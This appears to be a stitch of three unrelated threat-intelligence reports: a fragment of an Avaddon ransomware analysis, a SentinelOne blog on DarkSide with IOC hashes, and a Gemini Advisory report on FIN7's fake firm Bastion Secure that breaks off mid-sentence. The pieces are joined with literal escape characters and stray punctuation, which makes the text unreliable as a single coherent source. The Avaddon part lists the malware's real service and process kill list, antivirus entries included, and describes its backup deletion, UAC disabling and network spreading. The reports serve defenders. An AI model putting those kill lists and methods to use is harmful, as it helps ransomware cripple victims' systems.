easily reversed when the key is known. Below are the\nmain elements extracted from the configuration:\n\nExtensions\nnot to\nencrypt\n\n.exe,.bin,.sys,.ini,.dll,.lnk,.dat,.drv,.rdp,.prf,.swp\n\nRSA1\npublic key\n(b64)\n\nREDACTED\n\nDatabase\nextension\n\n.mdf,.mds,.sql\n\nServices\nto kill\n\nDefWatch,ccEvtMgr,ccSetMgr,SavRoam,dbsrv12,sqlservr,sqlagent,Intuit.QuickBooks.FCS,dbeng8,sqladhlp,QBIDPService,Culserve\n\nProcesses\nto kill\n\nsqlservr.exe,sqlmangr.exe,RAgui.exe,QBCFMonitorService.exe,supervise.exe,fdhost.exe,Culture.exe,RTVscan.exe,Defwatch.exe,w\n\nNote ID REDACTED\n\nAES 256\nkey (b64)\n\nREDACTED\n\nIV (b64) REDACTED\n\nDeleting backups\n\n\n\n8/14\n\nSince Windows XP, Microsoft has developed a technology known as Volume Snapshot Service or Shadow Copy. Shadow Copy allows\nautomatic file backups to be made transparently to the user. When the ransomware starts, this feature is disabled and then the backups are\ndeleted by executing multiple wmic and wbadmin commands. Most of the commands are executed with the CreateProcessW API. These\ncommands are console applications, so they display a cmd.exe window when executed.\n\nFigure 6 – Commands execution routine\n\nNevertheless, the first wmic command differs from the others. It is executed 3 times through the Microsoft Component Object Model (COM)\ntechnology with the WBEM Locator interface. This interface allows to execute a WMI command with Win32_Process class and Create\nmethod. This method is equivalent to the previous CreateProcessW API, but it is less detectable by attack response systems. At the same\ntime, the recycle garbage is emptied of its contents with the SHEmptyRecycleBinW API.\n\nDisabling the UAC\n\nTo avoid user interaction during the encryption process as much as possible, UAC (User Account Control) is disabled in the registry. Thus, no\ndialog box will appear when the system requires access to administrator rights. Below the code that edits registry key EnableLUA:\n\nFigure 7 – Registry key modification in order to disabling the UAC\n\nSearching for hidden volumes\n\nSome volumes are mounted by different users on the same machine. Each user therefore has access to his or her own mounted volumes. In\norder to encrypt these volumes, Avaddon will disable this partitioning by modifying the registry. This modification allows all processes running\nas an administrator to access volumes mounted by users of the machine. Some volumes are also hidden. To find and encrypt them, the\nransomware will browse all volumes on the disks with the FindFirstVolume API and then attempt to mount these volumes with\nSetVolumeMountPointW to access them:\n\n\n\n9/14\n\nFigure 8 – Browsing all volumes\n\nServices and processes kill list\n\nAvaddon cannot access some files, because they are already open by another program. For example, the files in a Microsoft SQL server\ndatabase. To overcome this problem, a routine allows stopping a selection of processes/services that are defined in the configuration.\nExamples of the code allowing deleting a service:\n\nFigure 9 – Kill list of services and process according to the malware configuration\n\nPersistence\n\nTo persist in the system, Avaddon copies itself into the %APPDATA%\\Microsoft\\Windows\\ folder with the same file name. Then it installs\nitself in the Windows task scheduler using the ITaskService interface through the Microsoft COM technology. The task is set to run the\nransomware copy every 10 minutes indefinitely:\n\n\n\n10/14\n\nFigure 10 – Interaction with task scheduler\n\nTo avoid multiple execution of the ransomware and thus encrypting files that have already been encrypted, a mutex is created under the name:\nGlobal{REDACTED}. The presence of this mutex is checked at each launch, if it is present then the program ends, because an instance of\nAvaddon is already running.\n\nAsynchronous Multithreading\n\nTo encrypt as quickly as possible Avaddon will use a Windows kernel technology called I/O CompletionPorts. This technology allows to\ncreate a thread pool to handle asynchronous I/O requests efficiently on multi-core systems. Each of the threads has the task of encrypting one\nfile at a time. The number of threads created is proportional to the number of processors/cores the machine has:\n\nFigure 10 – Asynchronous multithreading\n\nThe threads are then put on hold until they are presented with a file path to encrypt.\n\nEncryption through network\n\nAs noted earlier the ransomware will encrypt all volumes it encounters, whether local or remote. However, Avaddon goes further by using the\nmachine’s ARP cache to discover new networks. Each new network is then fully scanned for a CIFS/SMB volume that can be mounted and\nencrypted:\n\nFigure 11 – Network enumeration using ARP cache\n\nFile encryption\n\nAvaddon scans every file on the machine (or on remote volumes). Some file extensions are not encrypted according to the ransomware\nconfiguration, as they could affect the system stability and prevent the recovery of the ransom note and data.\n\nTo encrypt a file, Avaddon uses two modes. A first mode that allows you to specify how many bytes it should encrypt using the configuration,\nand a second mode that by default encrypts a maximum of 1048576 bytes. In our sample it is this second mode that is used. Thus beyond the\nfirst 1048576 (1000000h) bytes of a file, the data are no longer encrypted. Example of a text file :\n\nFigure 12 – Data examples\n\n\n\n11/14\n\nIn order to encrypt a file, Avaddon generates a random 256 CBC crypto-quality AES key with the CryptGenKey API. Each file is encrypted with\na unique key per block of 8192 bytes. This key is then encrypted with the RSA public key and concatenated to the encrypted string stands for\nmalware extension (identical to the RCID). This data is then inserted at the end of the file (see next section) and the AES key is deleted. In\norder to retrieve the AES key and decrypt the file, you must have the private key that Avaddon has. Below is the summarised diagram:\n\nFigure 13 – File encryption process\n\n1.1.1. File identifier\n\nEach encrypted file embeds at its end, some data containing its own AES key to allow decryption. The end structure is composed as follows\n(data in little endian):\n\nEncrypted AES key using RSA;\nRSA encrypted extension ;\nIn red on 8 bytes, the size of the original file;\nIn blue on 4 bytes, the sum of the size of the blocks: AES key + the size of the extension block;\nIn green on 4 bytes, the encryption mode which corresponds here to the maximum (see previous section);\nIn yellow on 4 bytes, the Avaddon identifier (magic value);\n\n\n\n12/14\n\nFigure 14 Encrypted data\n\n1.2.

It’s hard to understand the\neconomic reverberations of a disruptive attack on critical infrastructure, whether for financial\ngain or otherwise. With the pipeline being proactively shut down as of Sunday, May 9th,\nthere are concerns around how this outage will affect ongoing fuel prices and for how long.\nHow the coming weeks and months play out may serve as a template for predicting impact\nand risk associated with similar attacks that will inevitably follow.\n\nSentinelOne detects and protects against DarkSide ransomware. No action is required\nfor our customers.\n\n \nSentinelOne Protects from DarkSide Ransomware\nWatch Demo\nIn this post, we discuss the evolution of the DarkSide malware and affiliate networks,\nincluding the evolution of their feature sets and recruitment areas.\n\nWatch How SentinelOne Mitigates DarkSide Ransomware\nBeyond Protection, it's important that your security tool can mitigate and rollback in the case\nof a Ransomware attack\n\nhttps://www.sentinelone.com/blog/meet-darkside-and-their-ransomware-sentinelone-customers-protected/\nhttps://assets.sentinelone.com/ransom/darkside-vid\n\n\n2/9\n\nWatch Rollback\n\nWho is DarkSide?\n\nThe attack on Colonial Pipeline has been attributed to DarkSide, a relatively new\nransomware family that emerged on the crimeware market in November 2020.\n\nDarkSide claims not to attack Medical, Educational, Non-Profit, or Government sectors\nDarkSide launched as a RaaS (Ransomware-as-a-Service) with the stated goal of only\ntargeting ‘large corporations.’ They are primarily focused on recruiting Russian (CIS)\naffiliates, and are very skeptical of partnerships or interactions outside of that region. From\nthe onset, DarkSide was focused on choosing the ‘right’ targets and identifying their most\nvaluable data. This speaks to their efficiency and discernment when choosing where to focus\ntheir efforts. From their inception, DarkSide claimed they’d avoid attacking the medical,\neducational, non-profit, or government sectors.\n\nhttps://assets.sentinelone.com/ransom/darkside-mitigation\nhttps://www.sentinelone.com/cybersecurity-101/ransomware/\n\n\n3/9\n\nDarkSide affiliate recruitment post\nAt the time of launch, the features offered by DarkSide were fairly standard. They\nemphasized their speed of encryption and a wealth of options for dealing with anything that\nmay inhibit the encryption process (i.e., security software). They also advertised a Linux\nvariant with comparable features. Following in the footsteps of recently successful\nransomware families like Maze and Cl0p, DarkSide established a victim data leaks blog as\nfurther leverage to encourage ransom payouts.\n\nThe original DarkSide 1.0 Feature set was advertised as follows:\n\n\n\n4/9\n\nWindows [ \nfull ASM, salsa20 + rsa 1024,  \ni / o, own implementation of salsa and rsa,  \nfast / auto (improved space) / full,  \ntoken impersonalization for working with balls,  \nslave table, freeing busy files,  \nchanging file permissions,  \narp scanner,  \nprocess termination,  \nservice termination,  \ndrag-and-drop and much more]. \n\nLinux [ \nC ++, chacha20 + rsa 4096,  \nmultithreading (including Hyper-threading, analog of i / o on windows), \nsupport for truncated OS assemblies (esxi 5.0+),  \nfast / space,  \ndirectory configuration and much more]. \n\nAdmin panel [ \nfull ajax,  \nautomatic acceptance of Bitcoin, Monero,  \ngeneration of win / lin builds with indication of all parameters (processes, \n\nservices, folders, extensions ...),  \nbots reporting and detailed statistics on the company’s performance,  \nautomatic distribution and withdrawal of funds,  \nsub -accounts,  \nonline chat and many others]. \n\nLeak site [ \nhidden posts,  \nphased publication of target data and many more functionality]. \n\nCDN system for data storage [ \nReceiving quotas,  \nfast data loading,  \nstorage 6m from the moment of loading]. \n\nA Well-Organized Affiliate Network\n\nHopeful affiliates are subject to DarkSide’s rigorous vetting process, which examines the\ncandidate’s ‘work history,’ areas of expertise, and past profits among other things. To get\nstarted, affiliates were required to deposit 20 BTC (at the time, that amounted to around\n$300,000 USD).\n\n\n\n5/9\n\nDarkSide announces improved CDN\nOver the following months, DarkSide continued to improve its services, while also expanding\nits affiliate network. By late November 2020, DarkSide launched a more advanced Content\nDelivery Network (CDN) that allowed their operators to more efficiently store and distribute\nstolen victim data. Many of their high-value targets found themselves listed on the victim\nblog, including a number of financial, accounting, and legal firms, as well as technology\ncompanies.\n\nInitial access can take many forms depending on the affiliate involved, their needs, and\ntimeline. A majority of the campaigns observed were initiated only after the enterprise had\nbeen thoroughly scouted via Cobalt Strike beacon infections. After the initial reconnaissance\nphase, the operators would deploy the DarkSide ransomware wherever it would cause the\ngreatest disruption.\n\nDarkSide Decryption Tool – Is it Working?\n\nIn January 2021, Bitdefender released a DarkSide decryption tool. This tool was also posted\nto the NoMoreRansom project website. The tool had a reportedly high success rate.\n\nDarkSide 2.0 performance comparisons\nBy March, the group announced the launch of the new and improved DarkSide 2.0. The new\niteration included many improvements for both their Windows and Linux variants and is no\nlonger subject to the decryption tool. DarkSide 2.0 reportedly encrypts data on disk twice as\nfast as the original.\n\nOther updated features include:\n\nExpanded multi-processor support (parallel/simultaneous encryption across volumes)\n\nhttps://labs.bitdefender.com/2021/01/darkside-ransomware-decryption-tool/\n\n\n6/9\n\nEXE and DLL-based payloads\nUpdated SALSA20+RSA1024 implementation with “proprietary acceleration”\nNew operating modes (Fast / Full / Auto)\n19 total build settings\nActive account impersonation\nActive Directory support (discovery and traversal)\nNew CMD-line parameter support\n\nOn the Linux side, DarkSide 2.0 offers the following updates:\n\nUpdated multithreading support\nUpdated CHACHA20 + RSA 4096 implementation\n2 new operating modes (Fast / Space)\n14 Total build settings\nSupport for all major ESXi versions\nNAS support (Synology, OMV)\n\nAlong with this expanded feature set, SentinelLabs researchers have seen a shift in the\ndeployment of the DarkSide ransomware, from standard packers like VMProtect and UPX to\na custom packer internally referred to as ‘encryptor2.’\n\nA Battle for Territory\n\nWith the release of DarkSide 2.0, the group has continued to increase its footprint in the\nRansomware landscape. Along with their territorial expansion throughout 2021, DarkSide\nalso increased their ‘pressure campaigns’ on victims to include DDoS attacks along with the\nthreat of data leakage. They are able to invoke L3/L7 DDoS attacks if their victims choose to\nresist ‘cooperation’.\n\nMore recently, DarkSide operators have been attempting to attract more expertise around\nassessing data and network value, along with seeking others to provide existing access or\nnewer methods of initial access. These efforts are meant to make operations more\nstreamlined and increase efficiency.\n\n\n\n7/9\n\nNew methods and talent areas\nThe Colonial Pipeline attack is only the latest in a slew of increasingly daring ransomware\nattacks. The absolute best defense against a severe ransomware attack (and the nightmare\nthat follows) is preparation and prevention. Technology is a huge part of that, but one must\nnot discount user hygiene and education. It is vital to keep end users up to date on what\nthreats are out there and how to spot them. Vigilant users, along with robust preventative\ncontrols are key. Business continuity planning and disaster recovery drills are not fun, but\nthey are critical and necessary to ensure readiness and resilience against these threats.\n\nThe SentinelOne platform is fully capable of preventing and detecting the malware and\nartifacts associated with DarkSide ransomware. We hope that the pipeline starts flowing\nagain soon; our society depends on it to live.\n\nIndicators of Compromise\n\n\n\n8/9\n\nSHA256 \n\n156335b95ba216456f1ac0894b7b9d6ad95404ac7df447940f21646ca0090673 \n4d9432e8a0ceb64c34b13d550251b8d9478ca784e50105dc0d729490fb861d1a \n61ca175c2f04cb5279f8507e69385577cf04e4e896a01d0b5357746a241c7846 \nbfb31c96f9e6285f5bb60433f2e45898b8a7183a2591157dc1d766be16c29893 \na11cc5051e3a88428db495f6d8e4b6381a1cb3fa5946a525ef5c00bfcb44e210 \n2dcac9f48c3989619e0abd200beaae901852f751c239006886ac3ec56d89e3ef \n243dff06fc80a049f4fb37292f8b8def0fce29768f345c88ee10699e22b0ae60 \n12ee27f56ec8a2a3eb2fe69179be3f7a7193ce2b92963ad33356ed299f7ed975 \n9cee5522a7ca2bfca7cd3d9daba23e9a30deb6205f56c12045839075f7627297 \n5860f2415aa9a30c045099e3071f099313f653ae1806d6bcdb5f47d5da96c6d7 \n78782fd324bc98a57274bd3fff8f756217c011484ebf6b614060115a699ee134 \ndc4b8dfff72ff08ec4daa8db4c096a350a9a1bf5434ba7796ab10ec1322ac38c \n8cfd28911878af048fb96b6cc0b9da770542576d5c2b20b193c3cfc4bde4d3bc \n4edb883d1ac97824ee42d9f92917cc84b52995abcd17b2852a7e3d5bb567ffbe \ne9417cb1baec2826e3f5a6f64ade26c1374d74d8aa41bfabd29ea20ea5894b14 \nfb76b4a667c6d790c39fcc93a3aac8cd2a224f0eb9ece4ecfd7825f606c2a8b6 \n\nSHA1 \n\n2715340f82426f840cf7e460f53a36fc3aad52aa \n86ca4973a98072c32db97c9433c16d405e4154ac \n7944ae1d281bbeeb6f317e2ececf6b4c83e63a06 \na4e2deb65f97f657b50e48707b883ce2b138e787 \nf90f83c3dbcbe9b5437316a67a8abe6a101ef4c3 \n483c894ee5786704019873b0fc99080fdf1a0976 \n7ae73b5e1622049380c9b615ce3b7f636665584b \n2fc8514367d4799d90311b1b1f277b3fca5ca731 \nd1dfe82775c1d698dd7861d6dfa1352a74551d35 \nd3495ac3b708caeceffab59949dbf8a9fa24ccef \n7a29a8f5e14da1ce40365849eb59487dbb389d08 \n1f90eb879580faef3c37e10d0a0345465eebd4ee \n88fc623483f7ffe57f986ed10789e6723083fcd8 \n996567f5e84b7666ff3182699da0de894e7ea662 \n21145fd2cc8767878edbd7d1900c4c4f926a6d5b \n076d0d8d07368ef680aeb0c08f7f2e624c46cbc5 \n\nMITRE ATT&CK\n\nT1112 Modify Registry\n T1012 Query Registry\n T1082 System Information Discovery\n\n T1120 Peripheral Device Discovery\n T1005 Data from Local System\n\n T1486 Data Encrypted for Impact\n T1543.003 Create or Modify System Process: Windows Service\n\n \n\nhttps://attack.mitre.org/techniques/T1112/\nhttps://attack.mitre.org/techniques/T1012/\nhttps://attack.mitre.org/techniques/T1082/\nhttps://attack.mitre.org/techniques/T1120/\nhttps://attack.mitre.org/techniques/T1005/\nhttps://attack.mitre.org/techniques/T1486/\nhttps://attack.mitre.org/techniques/T1543/003/\n\n\n9/9\n\nT1490 Inhibit System Recovery\nT1553.004 Subvert Trust Controls: Install Root Certificate\nT1078 Valid Accounts\n\nhttps://attack.mitre.org/techniques/T1490/\nhttps://attack.mitre.org/techniques/T1553/004/\nhttps://attack.mitre.org/techniques/T1078/",

Gemini Advisory’s investigation and analysis of the source’s information has been\nongoing for the past several months. Although sensitive information has been redacted from\nthis report to protect the source, Gemini Advisory has provided law enforcement with the\ncomplete set of unredacted information. In addition, our findings were reported to our clients\nearlier this month and have been corroborated by Microsoft’s presentation at Mandiant Cyber\nDefense Summit 2021.\n\nKey Findings\n\nThe cybercriminal group FIN7 has been responsible for large-scale card theft\ncampaigns, resulting in the exposure of over 20 million payment card records, as well\nas ransomware attacks. Gemini has discovered that FIN7 is now running a new fake\ncompany called “Bastion Secure”, replacing the previously reported “Combi Security”.\n\nhttps://geminiadvisory.io/fin7-ransomware-bastion-secure\n\n\n2/13\n\nBastion Secure offered a job offer to a Gemini source and, in the process, provided the\nsource with files that analysts later determined were for the post-exploitation tools\nCarbanak and Lizar/Tirion. These two tools have been previously attributed to FIN7\nand establish the link between Bastion Secure and FIN7.\nThe tasks that were assigned to the Gemini source by FIN7—operating under the guise\nof Bastion Secure—matched the steps taken to prepare a ransomware attack,\nproviding further evidence that FIN7 has continued to expand into the ransomware\nsphere.\nFIN7 can pay unwitting “employees” far less than it would have to pay informed\ncriminal accomplices for its ransomware schemes. However, FIN7’s greed also\nafforded Gemini a view into the proprietary data of this prolific threat team, leading to\nthe exposure of another fake FIN7 company.\n\nBackground\n\nThe cybercriminal group FIN7 gained notoriety in the mid-2010s for large-scale malware\ncampaigns targeting the point-of-sale (POS) systems. In 2018, Gemini Advisory reported\nFIN7’s compromise of Saks Fifth Avenue and Lord & Taylor stores and the subsequent sale\nof over 5 million payment cards on the dark web. According to the US Department of Justice,\nthe broader FIN7 carding campaigns have resulted in the theft of over 20 million payment\ncard records and cost victims over $1 billion, making FIN7 one of the most infamous and\nprolific cybercriminal groups of the last decade. Now with ransomware proving to be\ncybercriminals’ preferred high-profit, jackpot venture, FIN7 has redeployed their expertise\nand capacity towards ransomware, with reports indicating that the group was involved in\nattempted ransomware attacks on US companies as early as 2020. Furthermore, despite\nfocus from law enforcement and the arrest of four FIN7 members from 2018 to 2020, FIN7’s\ncontinued activity shows that the group remains a powerful, active threat.\n\nIn 2018, the US Department of Justice revealed that FIN7 was posing as “Combi Security”, a\nfake cybersecurity company, to involve unaware IT specialists in their carding campaigns.\nWhile the public focus on Combi Security shut down that operation, Gemini has now\ndiscovered that FIN7 is using a new fake cybersecurity company named “Bastion Secure” to\nlure unaware IT specialists into supporting its continued expansion into ransomware.\n\nOver the course of FIN7’s existence, cybersecurity firms have referred to FIN7 by several\nnames—including Carbanak, Carbon Spider, Anunak, Cobalt Gang, and Navigator Group—\nwith some practitioners choosing to subdivide the FIN7 designation according to the target\ntype. While overlapping but different groups of individuals have likely conducted malicious\nactivity attributed to these threat groups, the unifying thread connecting the attack signatures\nto FIN7 has been the use of the malware Carbanak.\n\nAnalysis\n\nhttps://geminiadvisory.io/fin7-syndicate-hacks-saks-fifth-avenue-and-lord-taylor/?swcfpc=1\nhttps://www.justice.gov/opa/pr/high-level-member-hacking-group-sentenced-prison-scheme-compromised-tens-millions-debit-and\nhttps://threatpost.com/fin7s-liquor-lure-law-firm-backdoor/168086/\nhttps://therecord.media/fin7-hacker-sentenced-to-10-years-in-prison/\nhttps://www.justice.gov/opa/pr/three-members-notorious-international-cybercrime-group-fin7-custody-role-attacking-over-100\nhttps://attackevals.mitre-engenuity.org/enterprise/carbanak_fin7/\nhttps://attack.mitre.org/software/S0030/\n\n\n3/13\n\nA Gemini source was offered a position as an IT specialist at “Bastion Secure Ltd”, a\ncybersecurity “company” seeking C++, Python, and PHP programmers, system\nadministrators, and reverse engineers. A basic search for this company returns a legitimate-\nappearing website (www[.]bastionsecure[.]com), but analysis revealed that it is a fictitious\ncybersecurity company run by a cybercriminal group. During the interview process, the\nsource was given several tools for test assignments that the source would use if employed. \n\nGemini Advisory worked jointly with the Recorded Future Insikt Group to analyze the tools\nprovided by Bastion Secure and determined that they are actually components of the post-\nexploitation toolkits Carbanak and Lizar/Tirion, both of which have been previously attributed\nto the FIN7 group and can be used for both POS system infections and ransomware attacks.\n\nPrior to 2020, FIN7’s primary modus operandi was to compromise companies’ networks and\ninfect POS systems with credit card-stealing malware. Since 2020, cybersecurity researchers\nhave identified instances in which FIN7 gained access to company networks that were later\ninfected with either REvil or Ryuk ransomware. FIN7’s exact involvement in the deployment\nof ransomware—i.e., whether they sold the access to ransomware groups or have formed a\npartnership with these groups—remains unclear. However, the tasks that were assigned to\nthe Gemini source by FIN7 (operating under the guise of Bastion Secure) matched the steps\ntaken to prepare a ransomware attack, providing further evidence that FIN7 has expanded\ninto the ransomware sphere.\n\nFurthermore, due to Bastion Secure’s use of Carbanak and Lizar/Tirion and FIN7’s\nestablished practice of using fake cybersecurity companies to recruit talent, Gemini assesses\nwith high confidence that FIN7 is using the fictitious company Bastion Secure to recruit\nunwitting IT specialists into participating in ransomware attacks.\n\nhttps://www.recordedfuture.com/platform/finished-intelligence/\nhttps://threatpost.com/fin7-backdoor-ethical-hacking-tool/166194/\nhttps://threatpost.com/fin7s-liquor-lure-law-firm-backdoor/168086/\nhttps://blog.truesec.com/2020/12/22/collaboration-between-fin7-and-the-ryuk-group-a-truesec-investigation/\n\n\n4/13\n\nImage 1: Bastion Secure posts a job offer for a Windows Network Administrator on the\nRussian job site superjob.ru.\n\nMore broadly, FIN7’s decision to use a fake cybersecurity company to recruit IT specialists\nfor its criminal activity is driven by FIN7’s desire for comparatively cheap, skilled labor.\nBastion Secure’s job offers for IT specialist positions ranged between $800 and $1,200 USD\na month, which is a viable starting salary for this type of position in post-Soviet states.\nHowever, this “salary” would be a small fraction of a cybercriminal’s portion of the criminal\nprofits from a successful ransomware extortion or large-scale payment card-stealing\noperation. In effect, FIN7’s fake company scheme enables the operators of FIN7 to obtain\nthe talent that the group needs to carry out its criminal activities, while simultaneously\nretaining a larger share of the profits.\n\nFIN7’s use of Bastion Secure—even after the discovery of Combi Security, the group’s\nprevious fake cybersecurity company—indicates that FIN7 continues to believe that hiring\nunwitting IT specialists is the group’s best method for balancing the need for a technically\nskilled team against the operators’ desire for maximum profits.\n\nBastion Secure\n\nWith FIN7’s latest fake company, Bastion Secure, the criminal group leveraged true, publicly\navailable information from various legitimate cybersecurity companies to create a thin veil of\nlegitimacy around Bastion Secure. In effect, FIN7 is adopting disinformation tactics so that if\n\nhttps://geminiadvisory.io/wp-content/uploads/2021/10/img1.png\nhttps://www.superjob.ru/\n\n\n5/13\n\na potential hire or interested party were to fact check Bastion Secure, then a cursory search\non Google would return “true” information for companies with a similar name or industry to\nFIN7’s Bastion Secure.\n\nFIN7’s first step in obtaining a veil of legitimacy was to give their fake company the generic\nname “Bastion Secure”, which appears similar to several unrelated security-adjacent\ncompanies with highly listed Google search results:\n\nBastion Security Products Ltd: a US physical security company that was recently\nacquired by ECAMSECURE\nBastion Security Group: a US physical security consulting company\n\nSecond, Bastion Secure listed the company’s office addresses as:\n\n16e Follingsby Ave, Gateshead, United Kingdom (former address of the since-closed\nBastion Security (North) Limited)\n94 Yigal Alon St. Tower 1, Tel Aviv, Israel (office building containing multiple\nbusinesses, including the vehicle security company Cymotive)\nImperia Tower, 12 Presnenskaya Embankment, Moscow, 123100 Russia (office\nbuilding containing multiple businesses). Gemini contacted the Imperia Tower building\nadministrators, who confirmed that there is no company named Bastion Secure with\noffice space at the building.\nFortis Tower, 77-79 Gloucester Rd, Wan Chai, Hong Kong (office building containing\nmultiple businesses). Fortis Tower building administrators did not respond to Gemini’s\ninquiries; however, public records in the Hong Kong government’s “Companies\nRegistry’s Cyber Search Centre” revealed that there is no registered company named\n“Bastion Secure” operating in Hong Kong.\n\nFurthermore, the Bastion Secure website itself also appears legitimate at first glance;\nhowever, a deeper analysis revealed that the website is largely a copy of the website of\nConvergent Network Solutions Ltd., a legitimate cybersecurity company. Additionally, the\nBastion Secure website is hosted on the Russian domain registrar Beget, which\ncybercriminals commonly use.\n\nhttps://www.bastionsecurity.com/\nhttps://ecamsecure.garda.com/\nhttps://www.bastionsecuritygroup.com/\nhttps://find-and-update.company-information.service.gov.uk/company/01661392\nhttps://www.cymotive.com/\nhttps://www.cr.gov.hk/en/electronic/csc/general.htm\nhttps://www.cnsgroup.co.uk/\nhttps://geminiadvisory.io/wp-content/uploads/2021/10/img2.png\n\n\n6/13\n\nImages 2-3: The website of Bastion Secure (left) is a copy of the website of Convergent\nNetwork Solutions Ltd. (right), a legitimate cybersecurity company.\n\nImages 4-5:The Bastion Secure website (left) lists @CNS_Security as its Twitter account,\nmatching the Twitter account listed on CNS’ website (right). Additionally, the page description\nsentence includes text directly from the CNS website.\n\nAn initial analysis of the Bastion Secure website revealed that most of the submenus of the\nsite return a Russian-language HTTP 404 error, indicating that the site creators were\nRussian speakers. Since the initial analysis by Gemini, most of the website’s submenus have\nbeen fixed with appropriate pages; however, a deeper analysis revealed that some of the\nHTTP 404 errors remain unfixed.\n\nImage 6: Some Bastion Secure pages display a 404 error in Russian, indicating that the site\ndesigners are Russian speakers.\n\nhttps://geminiadvisory.io/wp-content/uploads/2021/10/img3.png\nhttps://geminiadvisory.io/wp-content/uploads/2021/10/img4.png\n\n\n7/13\n\nAs shown in the image below, an analysis of the page’s source code reveals the remnants of\nthe CNS site: the code on Bastion Secure still lists the same phone number that is listed\nprominently on the CNS homepage.\n\nImage 7: The source code under certain pages has been lifted directly from Convergent\nNetwork Solutions Ltd’s website.\n\nTo recruit IT specialists, Bastion Secure posts legitimate-appearing job offers on both their\nwebsite and prominent job search sites in post-Soviet states, as well as providing reputable-\nlooking contacts to potential hires for additional credibility. In the past several months,\nBastion Secure has posted job offerings for system administrators on job search sites and\nadded new vacancies for PHP, Python, and C++ programmers and reverse engineers on\ntheir website. On these job sites, Bastion Secure provides sufficiently professional\ninformation to appear legitimate and includes purported office information and a phone\nnumber (+7 499-642-3420). The list of legitimate Russian and Ukrainian job sites where\nBastion Secure has a presence and has advertised job postings includes:\n\nhttps://www.superjob.ru/vakansii/administrator-windows-setej-36641469.html\nhttps://ua.joblum.com/company/bastion-secure-ltd\nhttps://ua.jubee.org/ru/company/bastion-secure-ltd\nhttps://rabota.ua/company10418701\nhttps://jobs.ua/company-bastion-secure-ltd-1603731\nhttps://moscow.cataloxy.ru/firms/bastionsecure.com.htm – 74996423420\nhttps://remoteworkukraine.com/ua/company/ua-bastion-secure/\n\nhttps://www.cnsgroup.co.uk/\nhttps://geminiadvisory.io/wp-content/uploads/2021/10/img5.png\nhttps://www.superjob.ru/vakansii/administrator-windows-setej-36641469.html\nhttps://ua.joblum.com/company/bastion-secure-ltd\nhttps://ua.jubee.org/ru/company/bastion-secure-ltd\nhttps://rabota.ua/company10418701\nhttps://jobs.ua/company-bastion-secure-ltd-1603731\nhttps://moscow.cataloxy.ru/firms/bastionsecure.com.htm\nhttps://remoteworkukraine.com/ua/company/ua-bastion-secure/\n\n\n8/13\n\nImage 8: Bastion Secure’s company page on zoon.ru, a business development site serving\nRussian companies, job seekers, and consumers. \n\nFIN7—operating under the guise of Bastion Secure—is looking for programmers (PHP, C++,\nPython), system administrators, and reverse engineers in order to build a “staff” capable of\nconducting the tasks necessary for undertaking a range of cybercriminal activity. Given\nFIN7’s increased interest in ransomware, Bastion Secure is likely specifically looking for\nsystem administrators because an individual with this skill set would be able to:\n\nMap out compromised companies’ systems\nIdentify users and devices within the systems\nLocate backup servers and files\n\nIn order for the system administrator to map out a victim’s system, FIN7 would need to first\nprovide the individual with access to the system. FIN7 operators could obtain the initial\naccess through their well-documented phishing and social engineering methods or by\npurchasing access on dark web forums from a large pool of vendors. Once the system\nadministrator mapped out the system and identified backups, FIN7 could then escalate to the\nnext step in the malware and ransomware infection process. Gemini Advisory has previously\nwritten reports on how ransomware teams operate and some of their TTP’s.\n\nhttps://geminiadvisory.io/wp-content/uploads/2021/10/img6.png\nhttps://zoon.ru/\nhttps://www.bankinfosecurity.com/art-steal-fin7s-highly-effective-phishing-a-11286\nhttps://geminiadvisory.io/ransomware-the-new-cost-of-business/\nhttps://geminiadvisory.io/ransomware-unmasked-dispute-reveals-ransomware-ttps/\n\n\n9/13\n\nImages 9-11: Bastion Secure posts job vacancies for IT specialists on its website.\n\nFIN7’s Bastion Secure Reveals Criminality During Hiring Process\n\nhttps://geminiadvisory.io/wp-content/uploads/2021/10/img7.png\nhttps://geminiadvisory.io/wp-content/uploads/2021/10/img8.png\n\n\n10/13\n\nA Gemini source made contact with a Bastion Secure “HR representative” on a job search\nsite, leading to a hiring process in which Bastion Secure shared their business practices and\naccess to several of their tools. Gemini analyzed these tools to discover that they were in\nfact the post-exploitation tools Carbanak and Lizar/Tirion. As various security practitioners\nhave already attributed these tools and ransomware attacks to the FIN7 group, the fact that\nBastion Secure representatives provided the source with disguised versions of these\nattributable post-exploitation tools establishes a strong link between Bastion Secure and\nFIN7.\n\nFirst Stage: Interview Process\n\nThe first stage of the hiring process proceeded similarly to a legitimate job hiring process and\ngave no indication that Bastion Secure was a fake company for a cybercriminal group. First,\nthe HR representative from Bastion Secure communicated with the Gemini source and\ninformed them that they had reviewed the source’s resume and were interested in hiring\nthem as an IT specialist.\n\nAfter the source indicated that they were interested in the position, the source conducted a\ntypical first-stage interview with the HR representative via messages on Telegram. Although\nmany non-criminal individuals in post-Soviet states use Telegram as their preferred\nmessaging app, it is not typical for initial professional correspondences to be conducted on\nTelegram. \n\nAfter completing the interviews, the source was informed that they would need to:\n\nComplete several test assignments before beginning on a probationary basis\nSign a contract and non-disclosure agreement\nConfigure their computer by installing several virtual machines and opening ports\n\nSecond Stage: Practice Assignments\n\nAt face value, the second stage of the hiring process did not give a clear indication that\nBastion Secure is a cybercriminal operation. However, the actions taken later in the third\nstage clearly made the steps taken in the second stage highly suspicious. The source was\ninstructed to install certain platforms and conduct a series of practice assignments that would\nbe typical for the position. \n\nBastion Secure also informed the source that they were willing to train new hires in\ncybersecurity. When the source indicated that they were interested in learning, the company\nsent them additional files that included tools that could either be used for legitimate\npenetration testing or malicious activity. Although the tools provided to the source were\npotentially unusual for the position, Bastion Secure prefaced it by proposing that they would\ntrain the source to not only manage client’s systems but also secure them, lending credence\nto the use of these tools.\n\n\n\n11/13\n\nThird Stage: “Real” Assignment Signals Criminal Intent\n\nIn the third stage, Bastion Secure gave the source their first “real” assignment, and it became\nimmediately clear that the company was involved in criminal activity. The fact that the Bastion\nSecure representatives were particularly interested in file systems and backups signals that\nFIN7 was more interested in conducting ransomware attacks than POS infections.\n\nFor the first assignment, Bastion Secure provided the Gemini source with a “client company”\nto work on. The task would have been to use a script to collect information on domain\nadministrators, domain trust relationships, file shares, backups, and hypervisors (the\nsoftware responsible for creating and running virtual machines). At this point, the source\nbecame highly suspicious of Bastion Secure’s activities, noting the following red flags from\nearlier in the hiring process:\n\nBastion Secure provided access to the company’s network without any legal\ndocumentation or explanation, suggesting that the access may have been acquired\nthrough social engineering or purchased on the dark web\nBastion Secure was only interested in file systems and backup\nThe company warned of a heavy fine if the source installed antivirus software on the\nvirtual machine that they were 